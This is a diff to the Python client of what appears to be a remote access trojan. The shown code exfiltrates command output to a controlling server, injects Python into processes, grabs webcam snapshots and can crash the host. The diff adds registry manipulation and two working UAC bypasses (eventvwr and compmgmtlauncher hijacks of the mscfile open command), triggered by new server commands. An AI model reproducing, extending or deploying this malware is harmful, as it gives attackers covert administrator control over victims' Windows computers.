@@ -12,7 +12,6 @@
 # Github: https://github.com/slizbinksman
 # Build:  1.0.22
 # -------------------------------------------------------------
-
 import socket
 import base64
 import ctypes
@@ -21,6 +20,7 @@ import os
 import subprocess
 import threading
 import struct
+import winreg
 import cv2
 import psutil
 from PIL import ImageGrab
@@ -94,6 +94,14 @@ class Utilitys:
         webcam.release()                    #Else if the cam can be opened, release
         return True                         #return true
 
+    #Function will return the root registry key based on bool
+    def get_root_key(self,local_machine):
+        if local_machine:                           #If local machine
+            root_key = winreg.HKEY_LOCAL_MACHINE    #Set root to HKLM
+        elif not local_machine:                     #If not local machine
+            root_key = winreg.HKEY_CURRENT_USER     #set root to HKCU
+        return root_key                             #Return the root key
+
 class SystemManager:
 
     #Function will crash the computer with a blue screen
@@ -129,6 +137,56 @@ class SystemManager:
         output = command.stdout.read().decode()                                                    #Parse the output
         ExfilSocket().exfil_socket_send(output)                                                    #Send the output to the server
 
+    #Function will either create or moidfy a registry key and return a bool value
+    def handle_registry_key(self,modify,root_key_bool,key_path,key_value,key_name):
+        root_key = Utilitys().get_root_key(root_key_bool) #Get root key string
+        try:
+            if modify:                                    #If the modify bool is enabled, open the key
+                reg_key = winreg.OpenKey(root_key,key_path,0,winreg.KEY_ALL_ACCESS)
+            elif not modify:                              #elif modify != enabled, create a key
+                reg_key = winreg.CreateKey(root_key,key_path)
+            winreg.SetValueEx(reg_key,key_name,0,winreg.REG_SZ,key_value) #Set the value for the key
+            winreg.CloseKey(reg_key)                                      #Close the key
+            return True                                                   #Return true for success
+        except Exception:
+            return False                                                  #Return false if there's an issue
+
+    #Function will clean up a registry key or delete the value held inside
+    def clean_up_key(self,delete,root_key_bool,key_path,name):
+        root_key = Utilitys().get_root_key(root_key_bool)       #Get the root key
+        try:
+            if not delete:                                      #If delete is not enabled
+                key = winreg.OpenKey(root_key,key_path,0,winreg.KEY_ALL_ACCESS) #
+                winreg.DeleteValue(key,name)
+                winreg.CloseKey(key)
+            if delete:
+                winreg.DeleteKey(root_key,key_path)
+        except Exception:
+            pass
+
+class Elevation:
+
+    #Init strings for later usage
+    def __init__(self):
+        self.eventvwr_key = os.path.join('Software\\Classes\\mscfile\\shell\\open\\command')
+
+    #Function will attempt to elevate priveleges via the eventvwr bypass
+    def uac_eventvwr(self):
+        if SystemManager().handle_registry_key(True,False,self.eventvwr_key,CURRENT_DIR,None):  #If the registry key can be modified
+            subprocess.run('eventvwr',shell=True)                                               #Run event viewer to trigger the exploit
+            SystemManager().clean_up_key(False,False,self.eventvwr_key,None)                    #Delete the value that was assigned
+            ExfilSocket().exfil_socket_send(ClientSocket().good)                                #Tell the server the action was successful
+        else:                                                                                   #If the registry key couldn't be modified,
+            ExfilSocket().exfil_socket_send(ClientSocket().bad)                                 #Inform the server of the issue
+
+    #Function attempt to elevate privileges to administrator via the cmptmgmtlauncher bypass
+    def uac_compmgmt(self):
+        if SystemManager().handle_registry_key(True,False,self.eventvwr_key,CURRENT_DIR,None):   #If the registry key can be modified
+            subprocess.run('compmgmtlauncher',shell=True)                                        #Run compmgmt to trigger the exploit
+            SystemManager().clean_up_key(False,False,self.eventvwr_key,None)                     #Delete the value that was assigned
+            ExfilSocket().exfil_socket_send(ClientSocket().good)                                 #Tell the server the action was successful
+        else:
+            ExfilSocket().exfil_socket_send(ClientSocket().bad)                                  #Inform server that key couldn't be modified if there was an issue
 
 class Encryption:
 
@@ -167,6 +225,10 @@ class ClientSocket:
         self.term_process = 'terminate'
         self.snapshot = 'snap_shot'
         self.inject_python = 'inject_pie'
+        self.good = 'good'
+        self.bad = 'bad'
+        self.esc_eventvwr = 'esc_eventvwr'
+        self.esc_compmgmt = 'esc_compmgmt'
 
     #Function will connect to server to initiate handshake
     def connect_to_server(self):
@@ -266,6 +328,10 @@ class ClientSocket:
                 StreamSocket().webcam_snapshot()                                      #Send a webcam snapshot
             if action_flag == self.inject_python:                                     #If the action is to inject some python code,
                 CodeExecution().inject_and_exec(server_command[1],server_command[2])  #Inject python code
+            if action_flag == self.esc_eventvwr:                                      #If the action is to elevate perms via eventviewer
+                Elevation().uac_eventvwr()                                            #Elevate perms with the eventvwr method
+            if action_flag == self.esc_compmgmt:                                      #If the action is to elevate perms via compmgmtlauncher
+                Elevation().uac_compmgmt()                                            #Elevate perms with the compmgmtlauncher method
 
     #Function will retrieve all data sent by server socket
     def recv_all_data(self):
@@ -389,7 +455,7 @@ class CodeExecution():
     #Function will inject a python interpreter into a process and then load
     #Python code to be executed by it.
     def inject_and_exec(self,process_name,python_code):
-        process = Pymem(process_name)                   #Hooke the process
+        process = Pymem(process_name)                   #Hook the process
         process.inject_python_interpreter()             #Inject the python dll
         process.inject_python_shellcode(python_code)    #Inject the python code into the code
 
